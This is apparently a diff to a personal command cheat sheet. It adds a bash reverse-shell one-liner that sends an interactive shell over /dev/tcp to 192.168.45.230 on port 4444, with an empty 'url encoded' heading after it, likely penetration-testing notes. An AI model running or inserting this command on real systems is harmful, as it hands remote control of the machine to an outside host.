@@ -51,3 +51,11 @@ shows what is running on linux system:
 ```
 ps
 ```
+
+reverse shell one liner:
+```
+bash -c 'bash -i >& /dev/tcp/192.168.45.230/4444 0>&1'
+url encoded:
+
+```
+
